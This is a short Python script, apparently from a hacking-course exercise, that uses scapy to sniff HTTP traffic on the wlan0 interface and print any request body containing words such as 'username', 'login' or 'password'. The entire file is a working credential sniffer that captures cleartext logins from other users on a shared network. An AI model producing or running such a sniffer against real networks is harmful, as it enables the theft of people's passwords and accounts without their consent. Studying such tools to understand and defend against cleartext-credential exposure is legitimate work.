#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff (interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet (packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            try:
                load = load.decode('utf-8') # have to decode the load before going to loop or else it will throw an error "a bytes-like object is required, not 'str''. It was closed."
            except:
                print("[+] Error handling the packet")

            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print("[+] Possible username/password: " + load)
                    break
                
sniff("wlan0")